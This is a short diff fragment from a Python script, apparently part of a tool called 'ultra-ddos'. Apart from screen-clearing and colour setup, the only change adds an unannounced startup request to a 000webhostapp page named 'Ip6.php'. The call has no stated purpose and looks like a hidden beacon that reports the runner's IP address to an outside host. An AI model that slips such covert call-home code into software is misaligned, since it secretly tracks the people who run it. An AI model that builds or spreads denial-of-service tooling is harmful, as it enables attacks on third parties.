@@ -6,6 +6,7 @@ import sys
 
 os.system("clear")
 os.system("python src/logo.py")
+requests.get("http://flyzero.000webhostapp.com/project/ultra-ddos/Ip6.php")
 
 Green="\033[1;33m"
 Blue="\033[1;34m"
